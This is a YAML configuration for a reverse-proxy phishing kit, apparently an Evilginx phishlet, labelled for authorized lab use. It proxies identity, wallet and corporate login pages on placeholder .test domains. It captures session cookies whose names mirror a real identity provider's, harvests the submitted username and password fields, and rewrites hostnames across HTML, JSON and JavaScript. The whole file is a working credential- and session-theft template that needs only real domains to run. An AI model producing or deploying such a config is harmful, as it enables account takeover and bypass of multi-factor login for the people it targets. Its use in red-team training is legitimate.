# Generated by Chrome MV3 Lab Kit - Authorized lab use only
# Operator must configure phishlet domain/lures and lab-test

author: lab-operator
min_ver: 2.3.0
proxy_hosts:
  - phish_sub: login
    orig_sub: login
    domain: idp.test
    session: true
    is_landing: true
    auto_filter: true
  - phish_sub: login
    orig_sub: login
    domain: wallet.test
    session: true
    is_landing: false
    auto_filter: true
  - phish_sub: assets
    orig_sub: assets
    domain: authcdn.test
    session: false
    is_landing: false
    auto_filter: true
  - phish_sub: account
    orig_sub: account
    domain: corp.test
    session: true
    is_landing: false
    auto_filter: true
auth_tokens:
  - domain: idp.test
    keys:
      - fpc
      - stsservicecookie
      - api_session
  - domain: wallet.test
    keys:
      - MSPRequ
      - uaid
      - MSPAuth
      - MSPProf
  - domain: corp.test
    keys:
      - MSPVis
      - x-portal-routekey
      - admin_session
auth_urls:
  - /common/GetCredentialType
  - /checkpassword.srf
login:
  domain: wallet.test
  path: /ppsecure/post.srf
credentials:
  username:
    key: loginfmt
    search: (.*)
    type: post
  password:
    key: passwd
    search: (.*)
    type: post
sub_filters:
  - triggers_on: login.idp.test
    orig_sub: login
    domain: idp.test
    search: https://{hostname}/
    replace: https://{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: login.wallet.test
    orig_sub: login
    domain: wallet.test
    search: https://{hostname}/
    replace: https://{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: assets.authcdn.test
    orig_sub: assets
    domain: authcdn.test
    search: https://{hostname}/
    replace: https://{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
  - triggers_on: account.corp.test
    orig_sub: account
    domain: corp.test
    search: https://{hostname}/
    replace: https://{hostname}/
    mimes:
      - text/html
      - application/json
      - application/javascript
